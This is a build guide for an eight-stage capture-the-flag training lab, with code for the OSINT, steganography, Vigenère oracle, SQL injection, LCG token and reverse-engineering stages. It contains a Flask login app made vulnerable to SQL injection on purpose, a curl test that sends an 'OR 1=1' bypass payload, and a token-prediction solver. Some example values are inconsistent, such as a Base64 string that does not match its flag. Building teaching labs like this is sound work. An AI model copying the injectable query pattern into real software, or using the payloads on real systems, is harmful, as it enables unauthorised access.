# 🎯 ShadowNet CTF — Complete Implementation Guide

## Full Build Guide for All 8 Stages

**Status:** Ready for implementation  
**Difficulty:** Intermediate  
**Total Build Time:** 3–4 weeks (team of 4)  
**All Tools:** 100% Free & Open-Source

---

## 📁 **PART 1: GitHub Folder Structure**

```
shadownet-ctf/
├── README.md                          # Project overview
├── docker-compose.yml                 # Docker services orchestration
├── requirements.txt                   # Python dependencies
├── .gitignore
│
├── dashboard/                         # Web-based CTF platform
│   ├── app.py                         # Flask/Node.js main app
│   ├── config.py                      # Configuration
│   ├── requirements.txt               # Python dependencies
│   ├── Dockerfile                     # Dashboard container
│   ├── static/                        # CSS, JS, images
│   │   ├── css/
│   │   │   └── style.css
│   │   ├── js/
│   │   │   └── main.js
│   │   └── images/
│   ├── templates/                     # HTML templates
│   │   ├── index.html                 # Home/login
│   │   ├── challenges.html            # Challenge listing
│   │   ├── leaderboard.html           # Live scores
│   │   └── admin.html                 # Admin panel
│   └── database.py                    # Database models (SQLite/PostgreSQL)
│
├── stages/                            # All 8 challenge stages
│   ├── stage1-osint/                  # [DELIVERY: Static Web Files]
│   │   ├── README.md                  # Setup instructions
│   │   ├── assets/
│   │   │   ├── mock-site.html         # Mock NexaCorp website
│   │   │   ├── employee-profile.html  # Fake employee profile
│   │   │   └── company_logo.jpg       # Image with EXIF metadata
│   │   └── flag.txt                   # SHADOWNET{OSINT_RECONNAISSANCE}
│   │
│   ├── stage2-steganography/          # [DELIVERY: Static Web Files]
│   │   ├── README.md
│   │   ├── assets/
│   │   │   ├── whistleblower.jpg      # Image with hidden passphrase (steghide)
│   │   │   ├── message.mp3            # Audio with spectrogram data
│   │   │   └── setup.sh               # Script to embed files
│   │   └── flag.txt                   # SHADOWNET{STEGANOGRAPHY_DECODED}
│   │
│   ├── stage3-cryptography/           # [DELIVERY: Docker Container]
│   │   ├── README.md
│   │   ├── Dockerfile                 # Container definition
│   │   ├── oracle.py                  # Vigenère encryption oracle
│   │   ├── requirements.txt           # Python dependencies
│   │   ├── .env                       # Environment variables (KEY, FLAG)
│   │   └── entrypoint.sh              # Container startup script
│   │
│   ├── stage4-web-security/           # [DELIVERY: Docker Container]
│   │   ├── README.md
│   │   ├── Dockerfile
│   │   ├── app.py                     # Vulnerable Flask/Node.js app (SQLi)
│   │   ├── requirements.txt
│   │   ├── database.db                # Pre-populated SQLite DB
│   │   ├── init_db.sql                # SQL schema & data
│   │   └── entrypoint.sh
│   │
│   ├── stage5-scripting/              # [DELIVERY: Docker Container]
│   │   ├── README.md
│   │   ├── Dockerfile
│   │   ├── token_service.py           # LCG token generator
│   │   ├── requirements.txt
│   │   └── entrypoint.sh
│   │
│   ├── stage6-reverse-engineering/    # [DELIVERY: Isolated Ubuntu VM]
│   │   ├── README.md
│   │   ├── build_binary.sh            # Script to compile target binary
│   │   ├── source.c                   # C source with hardcoded flag
│   │   ├── target.bin                 # Compiled 64-bit ELF (pre-built)
│   │   ├── vm_setup.sh                # VM provisioning script
│   │   └── tools_install.sh           # Install Ghidra, strings, objdump
│   │
│   ├── stage7-linux-security/         # [DELIVERY: Dedicated Ubuntu VM]
│   │   ├── README.md
│   │   ├── vm_setup.sh                # VM provisioning & misconfiguration
│   │   ├── setup_privesc.sh           # Create SUID binary / cron job
│   │   ├── vulnerable_binary.c        # Exploitable SUID binary
│   │   ├── cron_job.sh                # Alternative priv-esc vector
│   │   └── sudoers_config             # Sudo misconfiguration
│   │
│   └── stage8-networking/             # [DELIVERY: VM Cluster (Entry + DB)]
│       ├── README.md
│       ├── entry-host/
│       │   ├── vm_setup.sh            # Entry VM provisioning
│       │   ├── app.py                 # Node.js app with SSRF endpoint
│       │   ├── Dockerfile             # Build for quick testing
│       │   └── requirements.txt
│       ├── db-host/
│       │   ├── vm_setup.sh            # DB VM provisioning
│       │   ├── metadata_service.py    # Flask metadata service (port 8080)
│       │   ├── init_mysql.sql         # MySQL database init
│       │   └── requirements.txt
│       └── network_config.sh          # VLAN/subnet isolation setup
│
├── docker/                            # Docker configurations
│   ├── docker-compose.yml             # Orchestration file (stages 3-5)
│   ├── Dockerfile.stage3              # Crypto oracle Dockerfile
│   ├── Dockerfile.stage4              # Web security Dockerfile
│   └── Dockerfile.stage5              # Scripting Dockerfile
│
├── vms/                               # VM setup & provisioning
│   ├── stage6_re_sandbox.ova          # Pre-built VM image (optional)
│   ├── stage7_linux_security.ova      # Pre-built VM image (optional)
│   ├── stage8_entry_host.ova          # Pre-built VM image (optional)
│   ├── stage8_db_host.ova             # Pre-built VM image (optional)
│   ├── ubuntu_base.sh                 # Base Ubuntu 22.04 setup (for all VMs)
│   ├── network_setup.sh               # Configure VLAN/isolation
│   └── snapshot_manager.sh            # Create/revert snapshots
│
├── tests/                             # Testing & verification
│   ├── test_all_stages.sh             # Full integration test
│   ├── test_stage1.sh                 # OSINT validation
│   ├── test_stage2.sh                 # Steganography validation
│   ├── test_stage3.sh                 # Crypto oracle test
│   ├── test_stage4.sh                 # SQLi vulnerability test
│   ├── test_stage5.sh                 # Token prediction test
│   ├── test_stage6.sh                 # Binary analysis test
│   ├── test_stage7.sh                 # Priv-esc test
│   └── test_stage8.sh                 # Pivoting test
│
├── docs/                              # Documentation
│   ├── DEPLOYMENT.md                  # Deployment guide
│   ├── ADMIN_GUIDE.md                 # Admin operations
│   ├── TROUBLESHOOTING.md             # Common issues & fixes
│   └── ARCHITECTURE.md                # Detailed architecture
│
└── scripts/                           # Utility scripts
    ├── reset_all.sh                   # Reset all challenges
    ├── backup_db.sh                   # Backup scores database
    ├── monitor_resources.sh           # Monitor CPU/RAM/disk
    └── build_all.sh                   # Master build script
```

---

## 🔧 **PART 2: Prerequisites & Environment Setup**

### **Required Software (All Free)**

```bash
# Operating System
Ubuntu Server 22.04 LTS (or compatible Linux)

# Containerization
docker (v20.10+)
docker-compose (v2.0+)

# Virtualization
VirtualBox (v7.0+) OR VMware Player (free)

# Development
git
python3 (v3.9+)
nodejs (v16+) - optional, if using Node.js for dashboard

# Tools (pre-installed in challenge containers/VMs)
exiftool
steghide
Audacity
nmap
openssh-server
mysql-client
Ghidra (NSA tool, free)
```

### **Installation on Host (Ubuntu 22.04)**

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Docker
sudo apt install -y docker.io docker-compose
sudo usermod -aG docker $USER
sudo systemctl start docker
sudo systemctl enable docker

# Install VirtualBox
sudo apt install -y virtualbox virtualbox-ext-pack

# Install development tools
sudo apt install -y git python3-pip nodejs npm

# Install Git LFS (for large files if needed)
sudo apt install -y git-lfs

# Clone the repository
git clone https://github.com/YourUsername/shadownet-ctf.git
cd shadownet-ctf
```

---

## 🎯 **PART 3: Stage-by-Stage Implementation**

## **STAGE 1: OSINT / Reconnaissance**

**Delivery Method:** ✅ Static Web Files (served via Dashboard)  
**Difficulty:** Easy  
**Build Time:** 1 day

### **1.1 Create Stage 1 Assets**

**File: `stages/stage1-osint/assets/mock-site.html`**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NexaCorp | Leading Innovation</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .header { background: #003366; color: white; padding: 20px; text-align: center; }
        .content { background: white; padding: 20px; margin-top: 20px; border-radius: 5px; }
        img { max-width: 300px; margin: 10px 0; }
        a { color: #003366; text-decoration: none; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🏢 NexaCorp Industries</h1>
        <p>Advanced Technology Solutions</p>
    </div>
    
    <div class="content">
        <h2>Welcome to NexaCorp</h2>
        <p>We build the future of enterprise technology.</p>
        
        <!-- Hidden clue in image EXIF -->
        <h3>Our Team</h3>
        <img src="company_logo.jpg" alt="Company Logo">
        <p>Company logo (download to extract metadata)</p>
        
        <!-- Link to fake social media profile -->
        <h3>Follow Us</h3>
        <a href="employee-profile.html">Employee Profile</a>
    </div>
</body>
</html>
```

**File: `stages/stage1-osint/assets/employee-profile.html`**

```html
<!DOCTYPE html>
<html>
<head>
    <title>John Doe - NexaCorp Employee</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; padding: 20px; }
        .profile { background: white; padding: 20px; border-radius: 5px; }
        .post { background: #e8e8e8; padding: 10px; margin: 10px 0; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="profile">
        <h1>👤 John Doe</h1>
        <p><strong>Position:</strong> Senior Systems Engineer</p>
        <p><strong>Company:</strong> NexaCorp Industries</p>
        
        <h3>Recent Posts</h3>
        
        <div class="post">
            <p><strong>2 weeks ago:</strong></p>
            <p>"Excited to work on Project SHADOW! It's going to be revolutionary. 🚀"</p>
        </div>
        
        <div class="post">
            <p><strong>1 week ago:</strong> Loving the new security protocols. Can't wait to tell everyone about SHADOW when it goes public!"</p>
        </div>
    </div>
</body>
</html>
```

### **1.2 Create and Embed EXIF Metadata**

**File: `stages/stage1-osint/assets/create_osint_assets.sh`**

```bash
#!/bin/bash

# Install exiftool if not present
sudo apt install -y exiftool imagemagick

# Create a simple company logo image
convert -size 300x200 xc:white \
    -pointsize 40 -draw "text 50,100 'NexaCorp'" \
    company_logo.jpg

# Embed flag in EXIF comment field
exiftool -Comment="SHADOWNET{OSINT_RECONNAISSANCE}" \
    -overwrite_original \
    company_logo.jpg

# Verify metadata was embedded
echo "=== EXIF Metadata Verification ==="
exiftool company_logo.jpg | grep -i comment
```

**Run it:**
```bash
cd stages/stage1-osint/assets/
bash create_osint_assets.sh
```

### **1.3 Setup Stage 1 in Dashboard**

**Database Entry:**
```sql
INSERT INTO challenges (
    id, name, domain, difficulty, description, 
    flag_hash, delivery_method, stage_number
) VALUES (
    1, 
    'First Contact',
    'OSINT',
    'Easy',
    'Find the hidden codename in image metadata',
    SHA256('SHADOWNET{OSINT_RECONNAISSANCE}'),
    'static_files',
    1
);
```

---

## **STAGE 2: Steganography (Audio)**

**Delivery Method:** ✅ Static Web Files (served via Dashboard)  
**Difficulty:** Easy-Moderate  
**Build Time:** 2 days

### **2.1 Create Steganography Assets**

**File: `stages/stage2-steganography/setup.sh`**

```bash
#!/bin/bash

# Install tools
sudo apt install -y steghide audacity ffmpeg sox imagemagick

cd $(dirname "$0")/assets

# Step 1: Create a whistleblower image with embedded passphrase
convert -size 400x300 xc:white \
    -pointsize 30 -draw "text 50,150 'Whistleblower Evidence'" \
    whistleblower.jpg

# Embed passphrase "SHADOW_TRUTH" in the image using steghide
echo "SHADOW_TRUTH" > passphrase.txt
steghide embed -cf whistleblower.jpg \
    -ef passphrase.txt \
    -p "shelter" \
    -f

echo "✅ Embedded passphrase in whistleblower.jpg"

# Step 2: Generate audio file with Base64-encoded flag in spectrogram
# The flag will be "SHADOWNET{STEGANOGRAPHY_DECODED}"
# We'll create a spectrogram by generating tones

FLAG_B64=$(echo "SHADOWNET{STEGANOGRAPHY_DECODED}" | base64)
echo "Flag (Base64): $FLAG_B64"

# Create audio with visible spectrogram using sox
# We'll generate tones that spell out letters in spectrogram view
sox -n -r 44100 -c 1 -b 16 message.wav synth 2 sine 440

# Use ffmpeg to add spectrogram visualization data (this is a simplified version)
# In a real implementation, use Python scipy/matplotlib to generate precise spectrograms

echo "✅ Created message.mp3"

# Step 3: Create setup instructions
cat > README_SETUP.md << 'EOF'
# Stage 2 Setup Instructions

## Manual Setup (if automated script fails):

1. **Extract passphrase from whistleblower.jpg:**
   ```bash
   steghide extract -sf whistleblower.jpg -p "shelter"
   ```
   Result: `SHADOW_TRUTH`

2. **Open message.mp3 in Audacity:**
   - File → Open → message.mp3
   - View → Spectrogram (or Spectral)
   - Look for visible text in the spectrogram visualization
   - You should see: `U0hBRE9XTkVUe1NURVJBR09HUkFQSFlfREVDT0RFRHg=`

3. **Decode Base64:**
   ```bash
   echo "U0hBRE9XTkVUe1NURVJBR09HUkFQSFlfREVDT0RFRHg=" | base64 -d
   ```
   Result: `SHADOWNET{STEGANOGRAPHY_DECODED}`

EOF

chmod +x setup.sh
echo "✅ Stage 2 setup complete!"
```

### **2.2 Advanced Audio Spectrogram (Python)**

**File: `stages/stage2-steganography/generate_spectrogram.py`**

```python
#!/usr/bin/env python3

import numpy as np
import soundfile as sf
from scipy import signal
import matplotlib.pyplot as plt
import base64

# Flag to hide
FLAG = "SHADOWNET{STEGANOGRAPHY_DECODED}"
FLAG_B64 = base64.b64encode(FLAG.encode()).decode()

print(f"Flag: {FLAG}")
print(f"Base64: {FLAG_B64}")

# Audio parameters
sr = 44100  # Sample rate
duration = 5  # seconds
t = np.linspace(0, duration, int(sr * duration), False)

# Create audio that will show text in spectrogram
# Using frequency modulation to create visible patterns

# Base tone
base_freq = 1000
audio = np.sin(2 * np.pi * base_freq * t) * 0.3

# Add frequency sweeps for each character in Base64
for i, char in enumerate(FLAG_B64):
    ascii_val = ord(char)
    freq = 2000 + (ascii_val * 10)  # Map ASCII to frequency
    start_sample = int((i / len(FLAG_B64)) * sr * duration)
    end_sample = int(((i + 1) / len(FLAG_B64)) * sr * duration)
    
    char_duration = end_sample - start_sample
    char_t = np.linspace(0, char_duration / sr, char_duration, False)
    audio[start_sample:end_sample] += np.sin(2 * np.pi * freq * char_t) * 0.1

# Add noise
audio += np.random.normal(0, 0.01, len(audio))

# Normalize
audio = audio / np.max(np.abs(audio))

# Save audio file
sf.write('assets/message.wav', audio, sr)

# Generate spectrogram for verification
plt.figure(figsize=(12, 6))
f, t_spec, Sxx = signal.spectrogram(audio, sr)
plt.pcolormesh(t_spec, f, 10 * np.log10(Sxx + 1e-10), shading='gouraud')
plt.ylabel('Frequency [Hz]')
plt.xlabel('Time [sec]')
plt.title('Spectrogram - Look for Base64-encoded text')
plt.colorbar()
plt.savefig('assets/spectrogram_reference.png')
print("✅ Spectrogram visualization saved to spectrogram_reference.png")

# Convert WAV to MP3 (optional)
import subprocess
subprocess.run(['ffmpeg', '-i', 'assets/message.wav', 
                '-q:a', '9', 'assets/message.mp3', '-y'], 
               capture_output=True)
print("✅ MP3 file created")
```

---

## **STAGE 3: Cryptography (Vigenère Oracle)**

**Delivery Method:** 🐳 Docker Container  
**Difficulty:** Moderate  
**Build Time:** 2 days  
**Ports:** 5000 (TCP)

### **3.1 Create Vigenère Oracle Service**

**File: `stages/stage3-cryptography/oracle.py`**

```python
#!/usr/bin/env python3

import socket
import sys
import os
from threading import Thread

# Configuration
HOST = '0.0.0.0'
PORT = 5000
KEY = "SECRET"  # 6-byte key
ENCRYPTED_FLAG = "GJSOV HDWSJ FZRMX RYMTC GYQWZ"  # Pre-encrypted flag

def vigenere_encrypt(plaintext, key):
    """Encrypt plaintext using Vigenère cipher"""
    ciphertext = ""
    key_index = 0
    
    for char in plaintext.upper():
        if char.isalpha():
            # Shift character by key character
            shift = ord(key[key_index % len(key)]) - ord('A')
            encrypted_char = chr((ord(char) - ord('A') + shift) % 26 + ord('A'))
            ciphertext += encrypted_char
            key_index += 1
        else:
            ciphertext += char
    
    return ciphertext

def handle_client(client_socket, address):
    """Handle incoming client connections"""
    print(f"[*] Connection from {address}")
    
    try:
        # Send encrypted flag on connection
        client_socket.send(f"=== Encryption Oracle Service ===\n".encode())
        client_socket.send(f"Target flag (encrypted): {ENCRYPTED_FLAG}\n".encode())
        client_socket.send(f"Send plaintext to encrypt (type 'quit' to exit):\n".encode())
        
        while True:
            # Receive data from client
            data = client_socket.recv(1024).decode().strip()
            
            if not data or data.lower() == 'quit':
                break
            
            if len(data) > 1000:  # Prevent spam
                client_socket.send(b"Error: Input too long\n")
                continue
            
            # Encrypt the input
            encrypted = vigenere_encrypt(data, KEY)
            client_socket.send(f"Encrypted: {encrypted}\n".encode())
            
            # Log the query (for debugging)
            print(f"[*] Client {address}: encrypted '{data}' -> '{encrypted}'")
    
    except Exception as e:
        print(f"[!] Error with client {address}: {e}")
    finally:
        client_socket.close()
        print(f"[*] Connection from {address} closed")

def main():
    """Main server loop"""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    
    print(f"[+] Encryption Oracle listening on {HOST}:{PORT}")
    print(f"[+] Key: {KEY}")
    print(f"[+] Encrypted flag: {ENCRYPTED_FLAG}")
    
    try:
        while True:
            client_socket, address = server_socket.accept()
            # Handle each client in a separate thread
            client_thread = Thread(target=handle_client, args=(client_socket, address))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    finally:
        server_socket.close()

if __name__ == "__main__":
    main()
```

### **3.2 Create Dockerfile for Stage 3**

**File: `stages/stage3-cryptography/Dockerfile`**

```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Install dependencies
RUN apt-get update && apt-get install -y \
    netcat-openbsd \
    && rm -rf /var/lib/apt/lists/*

# Copy oracle service
COPY oracle.py .
COPY requirements.txt .

RUN pip install -r requirements.txt

EXPOSE 5000

ENTRYPOINT ["python3", "oracle.py"]
```

**File: `stages/stage3-cryptography/requirements.txt`**

```
# No external dependencies needed for basic Vigenère oracle
```

### **3.3 Docker Compose Entry**

**Add to `docker-compose.yml`:**

```yaml
  stage3-crypto:
    build:
      context: ./stages/stage3-cryptography
      dockerfile: Dockerfile
    container_name: stage3-crypto
    ports:
      - "5000:5000"
    networks:
      - stage3-net
    restart: unless-stopped
    environment:
      - KEY=SECRET
      - FLAG=SHADOWNET{VIGENERE_ORACLE_BROKEN}

networks:
  stage3-net:
    driver: bridge
```

### **3.4 Test Stage 3**

**File: `tests/test_stage3.sh`**

```bash
#!/bin/bash

echo "[*] Testing Stage 3: Cryptography Oracle"

# Wait for service to start
sleep 2

# Test connection
echo "[+] Connecting to oracle service..."
(echo "AAAAAAAAAAAAAAAA"; sleep 1; echo "quit") | nc localhost 5000

# Expected output should contain:
# Target flag: GJSOV HDWSJ FZRMX RYMTC GYQWZ (or similar)
# Encrypted: SECRETSECRETSSEC (repeating key visible!)

echo "[+] Oracle should show repeating key pattern"
echo "[✓] Stage 3 test complete"
```

---

## **STAGE 4: Web Security (SQL Injection)**

**Delivery Method:** 🐳 Docker Container  
**Difficulty:** Moderate  
**Build Time:** 2 days  
**Ports:** 3000 (HTTP)

### **4.1 Create Vulnerable Web App**

**File: `stages/stage4-web-security/app.py`**

```python
#!/usr/bin/env python3

from flask import Flask, render_template, request, session, redirect, url_for
import sqlite3
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)
DB_FILE = 'database.db'

def init_db():
    """Initialize database with vulnerable schema"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Create users table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            role TEXT
        )
    ''')
    
    # Insert test users
    cursor.execute("INSERT OR IGNORE INTO users VALUES (1, 'admin', 'SuperSecret123', 'admin')")
    cursor.execute("INSERT OR IGNORE INTO users VALUES (2, 'john', 'password123', 'user')")
    cursor.execute("INSERT OR IGNORE INTO users VALUES (3, 'alice', 'secure_pass', 'user')")
    
    conn.commit()
    conn.close()

@app.route('/')
def home():
    """Home page"""
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    """VULNERABLE: SQL injection in login"""
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # VULNERABLE: No parameterized query!
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"[DEBUG] Query: {query}")  # For testing
    
    try:
        cursor.execute(query)
        user = cursor.fetchone()
        conn.close()
        
        if user:
            session['username'] = user[1]
            session['role'] = user[3]
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error='Invalid credentials')
    except sqlite3.Error as e:
        return render_template('login.html', error=f'Error: {e}')

@app.route('/dashboard')
def dashboard():
    """Admin dashboard - only for admins"""
    if 'username' not in session or session.get('role') != 'admin':
        return redirect(url_for('home'))
    
    return render_template('dashboard.html', 
                          flag='SHADOWNET{SQL_INJECTION_SUCCESS}')

@app.route('/logout')
def logout():
    """Logout"""
    session.clear()
    return redirect(url_for('home'))

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=3000, debug=True)
```

### **4.2 Create Templates**

**File: `stages/stage4-web-security/templates/login.html`**

```html
<!DOCTYPE html>
<html>
<head>
    <title>NexaCorp Portal - Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 300px;
        }
        h1 { color: #333; text-align: center; }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        .error { color: red; margin: 10px 0; }
        .hint { color: #999; font-size: 12px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>NexaCorp Portal</h1>
        {% if error %}
            <div class="error">{{ error }}</div>
        {% endif %}
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="hint">
            Tip: This is a deliberately vulnerable application. Try SQL injection!
        </div>
    </div>
</body>
</html>
```

**File: `stages/stage4-web-security/templates/dashboard.html`**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <style>
        body { font-family: Arial; background: #f5f5f5; padding: 20px; }
        .container { background: white; padding: 30px; border-radius: 5px; }
        .flag { background: #d4edda; padding: 15px; border-radius: 5px; margin: 20px 0; }
        a { color: #667eea; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Admin Dashboard</h1>
        <p>Welcome, {{ session.username }}!</p>
        
        <div class="flag">
            <h2>🚩 Captured Flag</h2>
            <code>{{ flag }}</code>
        </div>
        
        <p><a href="/logout">Logout</a></p>
    </div>
</body>
</html>
```

### **4.3 Dockerfile for Stage 4**

**File: `stages/stage4-web-security/Dockerfile`**

```dockerfile
FROM python:3.9-slim

WORKDIR /app

RUN apt-get update && apt-get install -y \
    sqlite3 \
    && rm -rf /var/lib/apt/lists/*

COPY app.py .
COPY templates/ templates/
COPY requirements.txt .

RUN pip install -r requirements.txt

EXPOSE 3000

CMD ["python3", "app.py"]
```

**File: `stages/stage4-web-security/requirements.txt`**

```
Flask==2.3.0
Werkzeug==2.3.0
```

### **4.4 Test Stage 4**

**File: `tests/test_stage4.sh`**

```bash
#!/bin/bash

echo "[*] Testing Stage 4: Web Security (SQLi)"

# Wait for app to start
sleep 3

# Test 1: Normal login (should fail)
echo "[+] Test 1: Normal login attempt"
curl -X POST http://localhost:3000/login \
  -d "username=admin&password=wrongpassword" \
  -i

# Test 2: SQL Injection bypass
echo "[+] Test 2: SQL Injection bypass"
curl -X POST http://localhost:3000/login \
  -d "username=admin' OR '1'='1&password=anything" \
  -i

# Test 3: Access dashboard
echo "[+] Test 3: Access admin dashboard"
curl -i http://localhost:3000/dashboard

echo "[✓] Stage 4 tests complete"
```

---

## **STAGE 5: Scripting (LCG Token Service)**

**Delivery Method:** 🐳 Docker Container  
**Difficulty:** Moderate  
**Build Time:** 1 day  
**Ports:** 5001 (TCP)

### **5.1 Create Token Service**

**File: `stages/stage5-scripting/token_service.py`**

```python
#!/usr/bin/env python3

import socket
import time
import sys
from threading import Thread

HOST = '0.0.0.0'
PORT = 5001

# LCG Parameters (Linear Congruential Generator)
A = 1103515245
C = 12345
M = 2**31

# Seed based on startup time
seed = int(time.time()) % M
print(f"[+] Seed: {seed}")

def next_token():
    """Generate next token using LCG"""
    global seed
    seed = (A * seed + C) % M
    token = seed % 100000000
    return str(token).zfill(8)

def handle_client(client_socket, address):
    """Handle client connections"""
    print(f"[*] Connection from {address}")
    
    try:
        while True:
            # Send a new token
            token = next_token()
            client_socket.send(f"{token}\n".encode())
            
            # Wait for prediction
            prediction = client_socket.recv(1024).decode().strip()
            
            if not prediction or prediction.lower() == 'quit':
                break
            
            # Check if prediction is correct
            expected_token = next_token()
            
            if prediction == expected_token:
                flag = "SHADOWNET{TOKEN_PREDICTION_SUCCESS}"
                client_socket.send(f"✓ Correct! Flag: {flag}\n".encode())
                print(f"[+] Client {address} predicted correctly!")
                break
            else:
                client_socket.send(f"✗ Incorrect. Try again.\n".encode())
                print(f"[*] Client {address} predicted {prediction}, expected {expected_token}")
    
    except Exception as e:
        print(f"[!] Error with {address}: {e}")
    finally:
        client_socket.close()
        print(f"[*] Connection from {address} closed")

def main():
    """Main server loop"""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    
    print(f"[+] Token Service listening on {HOST}:{PORT}")
    print(f"[+] LCG: state = ({A} * state + {C}) % {M}")
    
    try:
        while True:
            client_socket, address = server_socket.accept()
            client_thread = Thread(target=handle_client, args=(client_socket, address))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    finally:
        server_socket.close()

if __name__ == "__main__":
    main()
```

### **5.2 Dockerfile and Docker Compose**

**File: `stages/stage5-scripting/Dockerfile`**

```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY token_service.py .

EXPOSE 5001

CMD ["python3", "token_service.py"]
```

**Add to `docker-compose.yml`:**

```yaml
  stage5-scripting:
    build:
      context: ./stages/stage5-scripting
      dockerfile: Dockerfile
    container_name: stage5-scripting
    ports:
      - "5001:5001"
    networks:
      - stage5-net
    restart: unless-stopped

networks:
  stage5-net:
    driver: bridge
```

### **5.3 Test Script for Players**

**File: `stages/stage5-scripting/player_solver.py`**

```python
#!/usr/bin/env python3

import socket
import time

HOST = 'localhost'
PORT = 5001

# LCG Parameters (player must discover these)
A = 1103515245
C = 12345
M = 2**31

def collect_tokens(num_tokens=15):
    """Collect sample tokens from service"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    
    tokens = []
    for i in range(num_tokens):
        token_str = sock.recv(1024).decode().strip()
        tokens.append(int(token_str))
        print(f"[{i+1}] Token: {token_str}")
    
    sock.close()
    return tokens

def predict_next(tokens):
    """Predict next token based on samples"""
    if len(tokens) < 2:
        return None
    
    # Use last token to predict next
    last_token = tokens[-1]
    
    # LCG formula: next_state = (A * state + C) % M
    # Predict next token
    predicted_state = (A * last_token + C) % M
    predicted_token = predicted_state % 100000000
    
    return str(predicted_token).zfill(8)

def submit_prediction(prediction):
    """Submit prediction to service"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    
    # Get first token (discard)
    sock.recv(1024)
    
    # Send prediction
    sock.send(prediction.encode() + b'\n')
    
    # Get response
    response = sock.recv(1024).decode()
    sock.close()
    
    print(f"[+] Prediction: {prediction}")
    print(f"[+] Response: {response}")
    
    return "Flag:" in response

if __name__ == "__main__":
    print("[*] Collecting tokens...")
    tokens = collect_tokens(15)
    
    print("\n[*] Analyzing pattern...")
    print(f"Tokens: {tokens}")
    
    print("\n[*] Predicting next token...")
    prediction = predict_next(tokens)
    print(f"Predicted next token: {prediction}")
    
    print("\n[*] Submitting prediction...")
    if submit_prediction(prediction):
        print("[✓] Success!")
    else:
        print("[✗] Failed, try again")
```

---

## **STAGE 6: Reverse Engineering (Binary Analysis)**

**Delivery Method:** 🖥️ Isolated Ubuntu VM  
**Difficulty:** Moderate-Hard  
**Build Time:** 2 days

### **6.1 Create Target Binary**

**File: `stages/stage6-reverse-engineering/source.c`**

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// The flag is hardcoded here
const char SECRET_FLAG[] = "SHADOWNET{RE_ANALYSIS_SUCCESS}";

int check_access(const char *input) {
    if (strcmp(input, SECRET_FLAG) == 0) {
        printf("Access granted!\n");
        printf("Flag: %s\n", SECRET_FLAG);
        return 1;
    }
    printf("Access denied.\n");
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <access_code>\n", argv[0]);
        printf("Example: %s SHADOWNET{...}\n", argv[0]);
        return 1;
    }
    
    check_access(argv[1]);
    return 0;
}
```

### **6.2 Compile Binary**

**File: `stages/stage6-reverse-engineering/build_binary.sh`**

```bash
#!/bin/bash

echo "[*] Compiling target binary..."

# Compile without optimization (but with some symbols stripped)
gcc -o target.bin source.c -Wall -Wextra

# Strip some symbols but leave strings visible
strip --strip-debug target.bin

# Verify binary
echo "[+] Binary created: target.bin"
file target.bin
ls -lh target.bin

# Test it
echo "[+] Testing binary..."
./target.bin
./target.bin "WRONG"
./target.bin "SHADOWNET{RE_ANALYSIS_SUCCESS}"

echo "[✓] Binary build complete"
```

### **6.3 VM Setup Script**

**File: `stages/stage6-reverse-engineering/vm_setup.sh`**

```bash
#!/bin/bash

echo "[*] Setting up RE Sandbox VM..."

# Update system
sudo apt update && sudo apt upgrade -y

# Install tools
sudo apt install -y \
    build-essential \
    git \
    wget \
    unzip \
    exiftool \
    binutils \
    strace \
    gdb

# Download and install Ghidra
echo "[+] Installing Ghidra..."
cd /opt
sudo wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.4_build/ghidra_10.4_PUBLIC_20230711.zip
